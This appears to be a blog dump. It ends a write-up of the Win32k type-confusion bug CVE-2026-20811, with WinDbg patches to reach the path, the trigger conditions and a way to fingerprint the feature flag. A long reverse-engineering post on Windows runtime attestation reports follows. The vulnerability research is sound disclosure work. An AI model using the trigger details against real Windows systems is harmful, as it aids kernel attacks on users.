The PoC itself does not crash the system because the `CMonitorTopology*` at +0xA8 points to a valid, reference-counted session object under normal conditions. To confirm the dereference is reachable and exploitable when the topology is invalid, I zeroed +0xA8 via a WinDbg conditional breakpoint, manually simulating a freed or corrupted topology. This is an artificially induced condition: I have not demonstrated that the topology object can be freed or replaced naturally between the post and the processing (see the exploitation considerations section for why this is hard). What the BSOD confirms is that the pointer dereference is reachable from user-mode input and that an invalid value at +0xA8 produces a controlled kernel crash, not that the full exploit chain works end-to-end.

Two WinDbg patches are required to reach the async path on build 26100.7309, simulating the production environment where the feature flag is cloud-enabled and the caller has IAM access:

```
eb win32kfull!Feature_ApplyWindowActionConvergence__private_featureState 17
eb win32kfull!IAMThreadAccessGranted b8 01 00 00 00 c3
```

## Trigger Conditions Summary

1. `Feature_ApplyWindowActionConvergence` enabled (cloud rollout on ~26100.7000+ production builds)
2. Cross-thread `NtUserApplyWindowAction` call (window owner != caller thread)
3. `IAMThreadAccessGranted` returns TRUE (UWP apps, IAM-granted contexts)
4. DPI awareness set to Per Monitor v2 (`SetProcessDpiAwarenessContext(-4)`)

### Feature Flag Observability

One open question is whether an attacker can determine if `Feature_ApplyWindowActionConvergence` is enabled before attempting the exploit. The `featureState` value lives in the `win32kfull.sys` data section and is not directly readable from user mode. There is no documented user-mode API to query Win32k feature flag state. However, the feature changes observable behavior: when the feature is enabled, cross-thread `NtUserApplyWindowAction` calls that pass `IAMThreadAccessGranted` are dispatched asynchronously (the caller returns immediately), while the legacy path processes them synchronously or rejects them. An attacker could use timing differences or return value behavior to infer whether the async path is active, making the feature state indirectly fingerprint-able from user mode without kernel read access.

## Conclusion

CVE-2026-20811 is a type confusion caused by incomplete sanitization of an internal kernel buffer passed through the Win32k async message queue. The `CMonitorTopology*` at offset +0xA8 of a 0xB8-byte `CWindowAction` buffer survives sanitization in `xxxProcessAsyncWindowAction` and is dereferenced by `xxxApplyWindowAction` on the receiving thread.

The vulnerability was introduced by a cloud-deployed feature flag (`Feature_ApplyWindowActionConvergence`) and did not exist at RTM. Microsoft's fix disables the feature flag rather than fixing the code. The vulnerable path is unchanged in the post-patch binary but unreachable because the feature is off. A safe alternative using event type 31 with a 0x60-byte allow-list copy exists in both binaries as separate infrastructure, but is not yet wired into the async dispatch path.

This means the bug is mitigated, not fixed. If `Feature_ApplyWindowActionConvergence` is re-enabled in a future update without switching the async path to the safe event type 31 handler, the type confusion returns. Worth watching.

## Acknowledgements

MSRC credits **Daniil Romanovych** for reporting this vulnerability.

`_posts/2026-10-24-windows-runtime-attestation-report.md`:

```md
---
title: "Windows Runtime Attestation Reports: How the Secure Kernel Vouches for Your Drivers"
date: 2026-10-24
categories: [Windows Internals, Reverse Engineering]
tags: [kernel, windows-internals, vbs, secure-kernel, anti-cheat, vanguard, ida-pro, patch-diffing]
toc: true
---

In June 2026 Riot announced Vanguard On-Demand: on a sufficiently locked-down Windows 11 machine, the Vanguard kernel driver no longer has to start at boot. What makes that possible is a Windows feature Riot calls the "Runtime Driver Attestation Report", which lets an anti-cheat learn which drivers were loaded while it was not running. Riot describes it as "measuring every on-demand driver into the Trusted Platform Module", "a sort of continual, cumulative hash of all drivers that have been loaded since boot" ([Riot Games](https://www.riotgames.com/en/news/vanguard-on-demand){:target="_blank"}). As far as I can tell from the binaries, that is not how it works.

Microsoft documents the user-mode entry point, `GetRuntimeAttestationReport`, on a single Learn page, and the package structures live in `winnt.h`. Neither says which key signs the report, how a verifier gets that key, or when a driver is recorded, and `winnt.h` covers unloads and the report's blind spots only through a few comments and flags. Andrea Allievi's [New Year post](https://www.andrea-allievi.com/blog/new-year-post-anti-cheat-evolution-in-windows-11/){:target="_blank"} explains the idea, and Akash Trehan's [post on the hotpatch report](https://www.akashtrehan.com/secure-hotpatch-report/){:target="_blank"} covers a sibling report type; Trehan's announced parts on the core architecture and format were not published when I wrote this.

This post follows a report from the user-mode call through `ntdll`, the NT kernel, a secure call into VTL1 and the Secure Kernel, down to the bytes of the signed package. Then it goes the other way: how a driver load ends up in the Secure Kernel's table, where the signing key comes from, how long that key lives, and what the report is blind to. Everything is from Windows 11 build 26100.9711 unless I say otherwise, cross-checked against older and newer builds, and against experiments on a real machine. It is a continuation of my posts on [how kernel anti-cheats work](/posts/how-kernel-anti-cheats-work/) and on [reversing BEDaisy](/posts/reversing-bedaisy/). This is not a complete description of the feature, and Microsoft can change any of it in the next update. If something here is wrong, I welcome corrections.

## Background: Trust Levels, Secure Calls, and Measured Boot

Three pieces of context make the rest of this post easier to follow. If you have read Connor McGarr's posts on [secure calls](https://connormcgarr.github.io/secure-calls-and-skbridge/){:target="_blank"} and [secure image objects](https://connormcgarr.github.io/secure-images/){:target="_blank"}, you can skim the first two.

### Two Trust Levels

With virtualization-based security (VBS), Windows runs in two virtual trust levels. VTL0 is the world everyone knows: the NT kernel, drivers and applications. VTL1 runs the Secure Kernel, `securekernel.exe`. Connor puts it well: VTL1 is a higher security boundary with its own isolated physical address space, and Hyper-V is the bridge between the two. The Secure Kernel does not run inside the hypervisor. If that isolation holds, a kernel attacker in VTL0 can neither read nor write what the Secure Kernel keeps, and that is the property this whole feature leans on.

Memory Integrity, or HVCI, moves code integrity for kernel images into VTL1. Connor notes that VTL1 enforces W^X for kernel memory. Allievi points out that with HVCI a manually mapped driver cannot execute without passing through the Secure Kernel, because kernel memory is non-executable in the hypervisor's second-level page tables. So when NT loads a driver, `ci.dll` hands the image to VTL1 for validation, and the Secure Kernel keeps a secure image object for it. The image is tracked through a NAR, which, in the *Windows Internals* description Connor quotes, holds the range's base and size and a pointer to the secure image. Section 6 shows that this validation step is exactly where the report's records come from.

### Secure Calls

NT asks the Secure Kernel for services through secure calls. Connor compares them to system calls: an untrusted component asking a privileged one for something. On the NT side they all go through `nt!VslpEnterIumSecureMode`, which takes an operation type (almost always 2), a service number, a secure thread cookie and a 0x68-byte argument block. On the VTL1 side they land in `securekernel!IumInvokeSecureService`, a very large switch over the service number. The numbers come from the `_SKSERVICE` enum in the NT symbols. When data has to cross the boundary, NT describes it with MDLs, and the Secure Kernel validates and maps them itself.

### Measured Boot and the TCG Log

The last piece is the TPM. During boot, the firmware and the Windows boot loader measure what they load and configure into the TPM's PCRs, which can be extended but never written directly (a few can be reset, under specific conditions). The list of measurements goes into the TCG log, which Windows keeps on disk (`C:\Windows\Logs\MeasuredBoot`). The log is not signed, but the TPM can sign its current PCR values in a quote, and a verifier who replays the log and arrives at the quoted values knows the log is genuine.

Windows measures security settings this way, for example whether HVCI is on. It also measures public keys so that a remote party can trust them, and it can seal secrets to PCR values so that the TPM only releases them while those PCRs match. Both come back later: the report's signing key is measured into the TCG log, and the stored copy of that key is protected by a secret sealed to a set of PCRs.

Here is the whole system on one page. The rest of the post walks through it arrow by arrow.

![How a runtime attestation report is produced](/assets/img/posts/rtattest-overview.svg)
_The two runtime paths that cross the VTL boundary. A driver load reaches `ci.dll`, which records the validated image into the VTL1 table through secure call 0x1D. A report request goes down through secure call 0x117 and comes back as a signed package. Nothing in VTL0 reads the table or the key directly._

---

## 1. Setup: Builds, Symbols, and Why 25H2 Is 24H2

Riot and the public sample code say the driver report needs Windows 11 25H2. Binary-wise, there is no such thing as a 25H2 kernel. 25H2 and 26H2 are enablement packages on top of 24H2. A 25H2 machine reports `CurrentBuild` 26200, but its `ntoskrnl.exe` is version 10.0.26100.x. On my 26H2 test machine (`CurrentBuild` 26300, UBR 9711), `ntoskrnl.exe`, `securekernel.exe`, `skci.dll`, `ci.dll`, `kernelbase.dll`, `kernel32.dll` and `ntdll.dll` are byte-identical to the 10.0.26100.9711 files. I found no edition, version or feature-flag check anywhere on the path, so as far as I can tell any 24H2-train machine with the right cumulative update runs the same feature.

The feature arrived in two steps, which I found by diffing the function lists of consecutive servicing builds:

| build | update | what changes |
|---|---|---|
| 26100.7171 | KB5068861, 2025-11-11 | nothing yet |
| 26100.7309 | KB5070311, 2025-12-01 | `kernelbase!GetRuntimeAttestationReport`, `nt!ExpQueryRuntimeAttestationReport`, `nt!VslQueryRuntimeAttestationReport`, `securekernel!SkProduceRuntimeSignedReport` and its report and digest builders |
| 26100.7705 | KB5074105, 2026-01-29 | the Secure Kernel's NT driver table (`SkmiAddSecureImageToNtTable`, `SkAddRuntimeDriverToNtTable`, `SkpBuildNtDriversReport`, ...) and `skci!SkciCalculateImageAttestationData` |
| 26100.9711 | KB5127648, 2026-10-13 | the build this post describes |
| 28000.3231 | KB5127646 (26H1), 2026-10-13 | a second report type, built by `skci!SkciBuildAttestationReport` |

For about two months the API existed and returned a signed package, but the report builder in VTL1 called nothing: from 26100.7309 to 26100.7623 the driver report is a constant 16-byte record with zero drivers. Section 10 comes back to why that matters for verifiers.

Method, briefly. Binaries come from Microsoft's symbol server via Winbindex, and every name in this post comes from Microsoft's public PDBs; IDA ran headless with Lumina disabled so that no name came from anywhere else. The Secure Kernel and `skci.dll` PDBs carry function names but no types, so VTL1 structure fields stay as raw offsets (`+0x10`) rather than invented names. Each statement below was recorded with the disassembly or decompilation lines that support it and checked a second time, independently, from the raw artifacts; things I could only infer are marked as inferences.

---

## 2. The API From User Mode

The SDK prototype is simple:

```
BOOL GetRuntimeAttestationReport(
    UCHAR*  Nonce,               // 32 bytes
    UINT16  PackageVersion,      // must be 1
    UINT64  ReportTypesBitmap,   // bit 0 = driver report
    PVOID   ReportBuffer,
    PUINT32 ReportBufferSize);
```

Learn says the function lives in `kernel32.dll`. It does not: on 26100.7309, 26100.9711 and 28000.3231, `kernel32.dll` neither exports nor forwards it, and the only implementation is the `kernelbase.dll` export. So the import library you link against matters. In SDK 10.0.26100.7705, `mincore.lib`, `WindowsApp.lib` and the `*_apiset` libraries import the function from `api-ms-win-core-sysinfo-l1-2-8.dll`, which the API set schema on my machine maps to `kernelbase.dll`. `OneCore.Lib`, `OneCoreUAP.Lib` and `windowscoreheadless.Lib` import it from `KERNEL32.dll` instead, and `kernel32.lib` has no record for it at all. I built the same small program both ways. The api-set build binds to the kernelbase export, as a 64-bit and as a 32-bit process. The OneCore build does not start: the loader stops it with `STATUS_ENTRYPOINT_NOT_FOUND` (0xC0000139).

Here is the whole function on 26100.9711, as Hex-Rays sees it (`a1` = Nonce, `a2` = PackageVersion, `a3` = ReportTypesBitmap, `a4` = ReportBuffer, `a5` = ReportBufferSize):

```c
  v12 = 0; v13 = 0;                                       // nonce area zeroed
  if ( a5 == nullptr || a3 == 0 || (a3 & 0xFFFFFFFFFFFFFFFEuLL) != 0 )
    goto LABEL_7;
  v5 = *a5;                                               // read once
  if ( a4 != 0 )
  {
    if ( v5 == 0 || a1 == nullptr )
      goto LABEL_7;
  }
  else if ( v5 != 0 )
  {
LABEL_7:
    RtlSetLastWin32Error(LastError: 0x57u);               // ERROR_INVALID_PARAMETER
    return 0;
  }
  if ( a2 != 1 )
    goto LABEL_7;
  v10 = 0; v9[0] = 1; v9[1] = 1; v11 = a3;
  if ( a1 != nullptr ) { v7 = a1[1]; v12 = *a1; v13 = v7; }
  v8 = NtQuerySystemInformationEx(254, v9, 48, a4, v5, a5);
  if ( v8 < 0 ) { BaseSetLastNTError(v8); return 0; }
  return 1;
```

So there are two kinds of call. A size query passes `ReportBuffer == NULL` and `*ReportBufferSize == 0`, and the nonce may be NULL, in which case 32 zero bytes are sent. A real query needs a buffer, a nonzero size and a nonce. Anything else, a `PackageVersion` other than 1, or any bitmap bit other than bit 0 fails with `ERROR_INVALID_PARAMETER` before the kernel is involved. On 26H1 (28000.3231) the mask becomes `~3`, accepting the CodeIntegrity report type as well; on every 26100 build I looked at, only the driver report exists.

Everything is packed into a 48-byte block for `NtQuerySystemInformationEx`, information class 254, which the kernel PDB names `SystemRuntimeAttestationReport`. No Microsoft type describes the block; the field names in the last column are the ones the community phnt headers use:

| offset | size | kernelbase writes | phnt name |
|---|---|---|---|
| +0x00 | 2 | constant 1 | InputVersion |
| +0x02 | 2 | `PackageVersion` | PackageVersion |
| +0x04 | 4 | 0 | Reserved |
| +0x08 | 8 | `ReportTypesBitmap`, all 64 bits | ReportTypesBitmap |
| +0x10 | 32 | the nonce, or zeros if NULL | Nonce |

The caller's `ReportBufferSize` pointer is passed straight through as the kernel's `ReturnLength`, so the kernel writes the size directly into the caller's variable. `ntdll!NtQuerySystemInformationEx` is the usual stub, `mov eax, 16Fh` followed by `syscall`, and entry 0x16F of the 26100.9711 `KiServiceTable` is `NtQuerySystemInformationEx` (it was 0x16E in 26100.7309 and 26100.7705).

32-bit callers get a report too. The SysWOW64 `kernelbase.dll` has its own copy of the function, with the same checks and the same 48-byte block, and the 32-bit `ntdll` stub enters WOW64 with the same service number, 0x16F. There, `wow64!whNtQuerySystemInformationEx` sends class 254 to `whNT32QuerySystemInformationEx`, which jumps straight to the 64-bit `ntdll!NtQuerySystemInformationEx` with the caller's arguments. Nothing is converted and no temporary buffer is used, which works because the block has only fixed-size fields and the package contains no pointers. The pass-through arrived together with the API: the `wow64.dll` of 26100.7171 does not list class 254, the one of 26100.7309 does. I compiled my harness unchanged as a 32-bit program and ran it on the host. It got a 20,957-byte package whose nonce and signature check out against that boot's IDKS.

If you write a client, watch out for one behavior change. In 26100.7309 and 26100.7623, a size query that came back with `STATUS_BUFFER_TOO_SMALL` made the API return TRUE. From 26100.7705 that special case is gone, so the same size query returns FALSE with `ERROR_INSUFFICIENT_BUFFER` (122), which is what Trehan's post describes. Code that treated FALSE as fatal worked on the first builds and breaks on the later ones.

---

## 3. Through the NT Kernel

The kernel side is short and careful. The call chain on 26100.9711 is:

```
nt!NtQuerySystemInformationEx            input != NULL, length != 0, 8-byte alignment for class 254
  nt!ExpQuerySystemInformation           ProbeForWrite(out, len, 4), probe ReturnLength, case 254
    nt!ExpQueryRuntimeAttestationReport  length == 0x30, capture the 48 bytes once
      nt!VslQueryRuntimeAttestationReport  re-validate, bounce buffer + MDL, secure call 0x117
        nt!VslpEnterIumSecureMode         semaphore, VTL1 request loop
          nt!HvlSwitchToVsmVtl1           argument block into RBX + XMM10..XMM15, call the VTL-call entry
        nt!RtlCopyToUser                  bounce buffer -> caller buffer
```

Plain `NtQuerySystemInformation` cannot be used: it returns `STATUS_INVALID_INFO_CLASS` for class 254 before dispatching, on every build I checked. For user-mode callers `ExpQuerySystemInformation` calls `ProbeForWrite(SystemInformation, Length, 4)`, so the report buffer must be 4-byte aligned and writable, and whatever happens later, it writes its local `Size` back to `ReturnLength`. Kernel-mode callers of `ZwQuerySystemInformationEx` take the same path without any probing.

`ExpQueryRuntimeAttestationReport` is the class handler:

```c
  memset(v9, 0, sizeof(v9));                                  // 0x30-byte stack copy
  if ( Src == nullptr )             return 3221225485LL;      // STATUS_INVALID_PARAMETER
  if ( a2 != 48 )                   return 3221225476LL;      // STATUS_INFO_LENGTH_MISMATCH
  if ( a3 == nullptr && a4 != 0 || a5 == nullptr )
                                    return 3221225485LL;      // STATUS_INVALID_PARAMETER
  if ( a6 != 0 ) RtlCopyFromUser(a1: v9, Src, Size: 0x30u);   // user caller
  else           RtlCopyVolatileMemory(a1: v9, Src, Size: 0x30u);
  *a5 = a4;                                                   // Size = OutputBufferLength
  return VslQueryRuntimeAttestationReport(a1: (__int64)v9, a2: a3, a3: a5, a4: a6);
```

The 48 bytes are copied once into a kernel stack buffer before anything looks at them, and from there on only the copy is used. I did not find a double fetch on this path.

### 3.1 Who May Call

Nobody is turned away. The only calls on any control-flow path from `ExpQuerySystemInformation`'s entry to the class-254 handler are `memset`, `ProbeForWrite`, a processor-count query and a processor-group-count query. None of the three functions below it calls anything that looks at a token, a privilege, an integrity level, an AppContainer, the calling process or a feature flag. As far as I can tell from the code, any user-mode process at any integrity level can request a report, which matches Allievi's "callable from any user-mode application". The only throttle is global: ordinary threads wait on `VslpIumThreadSemaphore`, whose count the Secure Kernel itself chooses at boot.

Nothing on the VTL0 path checks HVCI, Secure Boot, the TPM, IOMMU, test-signing or debugging either. The one availability test is whether the VTL-call entry point exists: if `HvlpVsmVtlCallVa` is NULL, which I take to mean VSM is not running, `VslpEnterIumSecureMode` returns `STATUS_DEVICE_NOT_CONNECTED` and the API should fail with `ERROR_DEVICE_NOT_CONNECTED` (1167). That is from the code; I did not test it. The requirements Learn lists ("TPM 2.0, Secure Boot, VBS, HVCI, and IOMMU must be enabled. Test-signing and debug flags must be off.") are not enforced on this side; HVCI turns out to be enforced in VTL1, by a different mechanism (section 6).

### 3.2 VslQueryRuntimeAttestationReport and the Bounce Buffer

This is where the request becomes a secure call. Abridged:

```c
  v8 = *(_WORD *)(a1 + 2);                                     // PackageVersion
  memset_0(a1: v16, Val: 0, Size: 0x48u);                      // transfer context
  v9 = *(_QWORD *)(a1 + 8);                                    // ReportTypesBitmap
  memset_0(a1: v17, Val: 0, Size: 0x68u);                      // secure-call argument block
  if ( __PAIR32__(v8, *(_WORD *)a1) != 65537 || a3 == nullptr || v9 == 0 || (v9 & 0xFFFFFFFFFFFFFFFEuLL) != 0 )
    goto LABEL_22;                                             // STATUS_INVALID_PARAMETER
  v10 = *a3;                                                   // output length
  if ( a2 == nullptr ) { if ( v10 == 0 ) goto LABEL_13; goto LABEL_22; }    // size query
  if ( v10 == 0 ) goto LABEL_22;
  Pool2 = ExAllocatePool2(0x40u, *a3, 0x54736D56u);            // POOL_FLAG_NON_PAGED, 'VmsT'
  ...
  v12 = VslpLockPagesForTransfer(a1: (__int64)v16, a2: Pool2, a3: v10, a4: IoWriteAccess, a5: 2u);
  ...
LABEL_13:
  v18 = v15;  v19 = v9;                                        // args +0x08, +0x10
  if ( a2 != nullptr ) { v20 = *(_OWORD *)(a1 + 16); v21 = *(_OWORD *)(a1 + 32);   // nonce
                         v22 = v16[0];  v23 = v16[7]; }        // MDL VA, its PFN
  v12 = VslpEnterIumSecureMode(0x117, 2, 0, v17);             // Hex-Rays order: dx = service, cl = op type, r8d = cookie, r9 = block
  *a3 = Size;                                                  // args +0x48, for any status
  if ( v12 >= 0 && a2 != nullptr )
  { if ( Size <= v10 ) RtlCopyToUser(a2, Pool2, Size);
    else v12 = -1073741595; }                                  // STATUS_INTERNAL_ERROR
```

Three things stand out. First, the kernel validates the input again by itself, and on 26100.x it rejects bitmap bit 1 too, so calling the syscall directly does not unlock the CodeIntegrity report on these builds. Second, the Secure Kernel never sees the caller's buffer. The kernel allocates a nonpaged bounce buffer of the caller's size and describes it with an MDL, and it copies into the user buffer only at the end, with `RtlCopyToUser` inside a try block. Third, a size query does not even forward the nonce: there is no output buffer, so the argument block carries no nonce and no MDL, and only the size comes back.

`VslpLockPagesForTransfer` builds an MDL for the bounce buffer, then a second, embedded MDL that describes the first one's own memory. What crosses into VTL1 is the virtual address of the data MDL and the PFN of the page that holds it; the output length is not a separate argument, VTL1 learns it from the MDL's `ByteCount`. This is the "MDL describing the input MDL" pattern Connor described in his [secure calls post](https://connormcgarr.github.io/secure-calls-and-skbridge/){:target="_blank"}, with the second MDL built on the NT side. On this path the bounce buffer's page-rounded span must be at most 0x1FA000 bytes (506 pages, as many PFNs as fit in a single-page MDL), otherwise the call fails with `STATUS_INVALID_PARAMETER`. A consequence I did not test: a caller who passes a generous `*ReportBufferSize` above roughly 2 MB gets `ERROR_INVALID_PARAMETER` even though the buffer is big enough.

### 3.3 The Secure Call

The argument block is 0x68 bytes, again with no type in the PDB:

| offset | size | direction | content for this call |
|---|---|---|---|
| +0x00 | 1 | in | operation type 2 (secure service) |
| +0x01 | 1 | out | request code from VTL1 (1 or 6 = done; other values ask NT to run a service on VTL1's behalf) |
| +0x02 | 2 | in | service number 0x117 |
| +0x04 | 4 | both | secure thread cookie, 0 for ordinary threads; VTL1 writes it back |
| +0x08 | 2 in / 8 out | both | in: `PackageVersion`; out: the NTSTATUS, sign-extended to 64 bits (NT reads the low 4 bytes) |
| +0x10 | 8 | in | `ReportTypesBitmap` |
| +0x18 | 32 | in | nonce (absent in a size query) |
| +0x38 | 8 | in | VA of the data MDL (absent in a size query) |
| +0x40 | 8 | in | PFN of the page holding that MDL (absent in a size query) |
| +0x48 | 4 | out | package size |
| +0x50 | 24 | - | zero |

The service number is the PDB's `SECURESERVICE_QUERY_RUNTIME_ATTESTATION_REPORT`, the name Allievi mentions (without the prefix), and it moves with servicing updates: 0x115 in 26100.7309, 0x116 in 26100.7705, 0x117 in 26100.9711 and 0x125 in 28000.3231. Anything that hardcodes secure call numbers has to be rebuilt per build.

`HvlSwitchToVsmVtl1` then loads the whole block into registers rather than passing a pointer: bytes +0x00..+0x07 go into RBX and +0x08..+0x67 into XMM10 through XMM15, before an indirect call through `HvlpVsmVtlCallVa`:

```
mov     rbx, [rdx]                         ; args +0x00..+0x07
movdqu  xmm10, xmmword ptr [rdx+8]         ; ... through xmm15 <- [rdx+58h]
mov     r8, cr8
mov     rax, cs:HvlpVsmVtlCallVa
call    HvlpSwitchToVsmVtl1RetpolineHelper ; jmp rax
mov     [rdx], rbx                         ; registers copied back into the block
```

NT never encodes the hypercall itself. `HvlpGetVtlCallVa` asks the hypervisor at boot for an offset and points `HvlpVsmVtlCallVa` into the hypercall code page. Connor's description of the secure call as a wrapper around the VTL-call hypercall fits, but the hypercall code and register names come from public documentation, not from these binaries.

After the call, the kernel always copies the size from +0x48 back to the caller and passes VTL1's status through. Since 26100.7705 it also refuses to copy more than the caller asked for: if VTL1 reports a size larger than the output length, the result is `STATUS_INTERNAL_ERROR`. In 26100.7309 the kernel read `*Size` three times and copied whatever byte count VTL1 reported; 28000.3231 again has no such check.

The error surface, as ntdll 26100.9711 maps it to Win32:

| where | condition | NTSTATUS | GetLastError |
|---|---|---|---|
| kernelbase | bad arguments | none | 87 |
| `NtQuerySystemInformation` | class 254 through the non-Ex API | `0xC0000003` | 87 |
| `ExpQueryRuntimeAttestationReport` | input length not 0x30 | `0xC0000004` | 24 |
| `VslQueryRuntimeAttestationReport` | version, bitmap or buffer pair wrong; span over 0x1FA000 | `0xC000000D` | 87 |
| `VslQueryRuntimeAttestationReport` | bounce buffer allocation failed | `0xC000009A` | 1450 |
| `VslpEnterIumSecureMode` | VSM not running | `0xC000009D` | 1167 |
| VTL1 | buffer too small | `0xC0000023` | 122 |
| VTL1 | HVCI off (empty driver table) | `0xC00000BB` | 50 |
| `VslQueryRuntimeAttestationReport` | VTL1 size larger than the buffer (7705+) | `0xC00000E5` | 1359 |

### 3.4 Watching It Live

All of the above comes from the disassembly, so I wanted to watch one request go through. That needs kernel debugging, and my Secure Boot desktop refuses to enable it (section 11). I used a Hyper-V virtual machine instead, on 26100.9711 (its `ntoskrnl.exe` is byte-identical to the one I analyzed) with HVCI on. Getting a debugger to hold a session in a VBS guest took several attempts: the network transport never got a session, and a serial link on COM1 got one and then lost it partway through boot. What finally worked was the kernel debugger on the guest's COM2 (the port MSRC's Hyper-V research setup gives the kernel debugger), connected from the very start of boot (the session came up at system uptime zero), with breakpoints only on the attestation path. I changed several things between the failing and the working run, so I cannot say which one mattered.

At the initial break I set six breakpoints on the attestation path. The offsets come from the disassembly of `VslQueryRuntimeAttestationReport` that section 3.2 decompiles: +0x10f is the instruction after `VslpLockPagesForTransfer` returns, +0x179 is the call to `VslpEnterIumSecureMode`, +0x17e the instruction after it, and +0x1b3 the call to `RtlCopyToUser`.

```
     0 e Disable Clear  fffff805`9b3c4ee0     0001 (0001) nt!ExpQueryRuntimeAttestationReport
     1 e Disable Clear  fffff805`9b319100     0001 (0001) nt!VslQueryRuntimeAttestationReport
     2 e Disable Clear  fffff805`9b31920f     0001 (0001) nt!VslQueryRuntimeAttestationReport+0x10f
     3 e Disable Clear  fffff805`9b319279     0001 (0001) nt!VslQueryRuntimeAttestationReport+0x179
     4 e Disable Clear  fffff805`9b31927e     0001 (0001) nt!VslQueryRuntimeAttestationReport+0x17e
     5 e Disable Clear  fffff805`9b3192b3     0001 (0001) nt!VslQueryRuntimeAttestationReport+0x1b3
```

Then my harness asked for a report with an easy-to-spot nonce, `00 11 22 ... ff` twice. The harness calls the API twice, a size query and then the real query, and both hit the breakpoints. Here is the size query arriving in the class handler, with the 48-byte block still in the caller's memory:

```
==[1] nt!ExpQueryRuntimeAttestationReport
rcx=0000004e44cfef30 edx=30 r8=0000000000000000 r9=0000000000000000
0000004e`44cfef30  01 00 01 00 00 00 00 00-01 00 00 00 00 00 00 00  ................
0000004e`44cfef40  00 11 22 33 44 55 66 77-88 99 aa bb cc dd ee ff  .."3DUfw........
0000004e`44cfef50  00 11 22 33 44 55 66 77-88 99 aa bb cc dd ee ff  .."3DUfw........
    Image: rtattest.exe
```

`rcx` is the user-mode input block, `edx` its length 0x30, and `r8`/`r9` are a NULL buffer and a zero length: a size query. The nonce is in the block, because my harness passes one even for the size query, but the argument block handed to VTL1 a moment later does not contain it. Only `PackageVersion` (+0x08) and the bitmap (+0x10) are set; everything from +0x18 on is zero:

```
==[4] call VslpEnterIumSecureMode
edx=117 cl=2
ffff9684`fedc74d0  00000000`00000000 00000000`00000001
ffff9684`fedc74e0  00000000`00000001 00000000`00000000
ffff9684`fedc74f0  00000000`00000000 00000000`00000000
...
==[5] back from VTL1
eax=c0000023
ffff9684`fedc74d0  00000001`01170102 ffffffff`c0000023
ffff9684`fedc74e0  00000000`00000001 00000000`00000000
...
ffff9684`fedc7510  00000000`00000000 00000000`00002874
```

This is the size-query answer the code predicted, seen from VTL0. VTL1 returns `STATUS_BUFFER_TOO_SMALL`, written over the `PackageVersion` field at +0x08 as a 64-bit value, and the required size, 0x2874 (10,356 bytes), at +0x48. The first QWORD now reads `02 01 17 01 ...`: operation type 2, request code 1 ("done"), service 0x117. The DWORD at +0x04, which NT sets to 0 for an ordinary thread, comes back as 1, so VTL1 wrote it; NT only uses that field when VTL1 asks it to do work on its behalf, which it did not do here.

For the real query, the interesting stop is right after `VslpLockPagesForTransfer`. The data MDL describes a nonpaged pool buffer of exactly the caller's size, so this is the bounce buffer, not the user buffer:

```
==[3] after VslpLockPagesForTransfer
eax=0
transfer context:
ffff9684`fedc7480  ffffe68c`462a0010 00000000`00000000
ffff9684`fedc7490  00000000`00020038 00000000`00000000
ffff9684`fedc74a0  00000000`00000000 ffffe68c`462a0000
ffff9684`fedc74b0  00000010`00000048 00000000`00102aa0
ffff9684`fedc74c0  00000000`00000008
data MDL:
   +0x000 Next             : (null)
   +0x008 Size             : 0n72
   +0x00a MdlFlags         : 0n4
   +0x018 MappedSystemVa   : 0xffffe68c`4a38b000 Void
   +0x020 StartVa          : 0xffffe68c`4a38b000 Void
   +0x028 ByteCount        : 0x2874
   +0x02c ByteOffset       : 0
```

The transfer context is laid out as section 3.2 describes. At +0x00 is the data MDL's address, `ffffe68c'462a0010`. From +0x08 comes an embedded MDL that describes the data MDL itself: 0x48 bytes at offset 0x10 in the page `ffffe68c'462a0000`, locked (`MdlFlags` 2). At +0x38 is that page's PFN, 0x102aa0, and at +0x40 the flags value 8. The data MDL is 72 bytes because the 10,356-byte buffer spans three pages.

The argument block going into VTL1 now carries everything the size query left out: the nonce at +0x18, the data MDL's address at +0x38 and the PFN at +0x40. That is all VTL1 gets to find the buffer.

```
==[4] call VslpEnterIumSecureMode
edx=117 cl=2
ffff9684`fedc74d0  00000000`00000000 00000000`00000001
ffff9684`fedc74e0  00000000`00000001 77665544`33221100
ffff9684`fedc74f0  ffeeddcc`bbaa9988 77665544`33221100
ffff9684`fedc7500  ffeeddcc`bbaa9988 ffffe68c`462a0010
ffff9684`fedc7510  00000000`00102aa0 00000000`00000000
```

VTL1 answers with status 0 and size 0x2874. The last stop is the copy back to user mode, from the bounce buffer at `ffffe68c'4a38b000` into the caller's buffer, 0x2874 bytes:

```
==[6] RtlCopyToUser (bounce buffer to caller)
rcx=000001c84bb68ec0 rdx=ffffe68c4a38b000 r8=0000000000002874
ffffe68c`4a38b000  50 52 54 52 01 00 01 00-01 00 00 00 00 00 00 00  PRTR............
ffffe68c`4a38b010  74 28 00 00 0e 80 44 00-00 00 01 00 00 01 00 00  t(....D.........
ffffe68c`4a38b020  e8 26 00 00 00 00 00 00-00 11 22 33 44 55 66 77  .&........"3DUfw
ffffe68c`4a38b030  88 99 aa bb cc dd ee ff-00 11 22 33 44 55 66 77  .........."3DUfw
ffffe68c`4a38b040  88 99 aa bb cc dd ee ff-00 00 00 00 9f be 2f 69  ............../i
...
ffffe68c`4a38b18c  00 00 00 00 e8 26 00 00-61 00 00 00 63 72 61 73  .....&..a...cras
ffffe68c`4a38b19c  68 64 6d 70 2e 73 79 73-00 00 00 00 00 00 00 00  hdmp.sys........
```

That is a finished package, the same layout as the one in section 4.2: magic, version 1, one report, PackageSize 0x2874, `CALG_SHA_512`, a 256-byte signature, my nonce at 0x28, and a driver report with 0x61 (97) entries starting with `crashdmp.sys`. The package my harness received verifies with the IDKS measured in that boot's TCG log and fails with the previous boot's key; each of that VM's eight boots had a different key.

---

## 4. In VTL1: Building and Signing the Package

On the other side, `securekernel!IumInvokeSecureService` is the big switch Connor described. It treats the call as a secure service when the operation byte is 2, takes the 16-bit service code from offset +2 and dispatches through a 279-case jump table. Case 0x117 is the only one that reaches `SkProduceRuntimeSignedReport`, and it unpacks the argument block like this:

```
00019c38  mov     r9, [r14+38h]          ; output descriptor: VA of the VTL0 data MDL
00019c3c  lea     rax, [r14+48h]         ; &size (in/out)
00019c40  mov     rdx, [r14+10h]         ; ReportTypesBitmap
00019c44  lea     r8, [r14+18h]          ; nonce, 32 bytes held inline in the block
00019c48  movzx   ecx, word ptr [r14+8]  ; PackageVersion
00019c52  mov     rax, [r14+40h]         ; PFN of the page holding the MDL
00019c5b  call    SkProduceRuntimeSignedReport
```

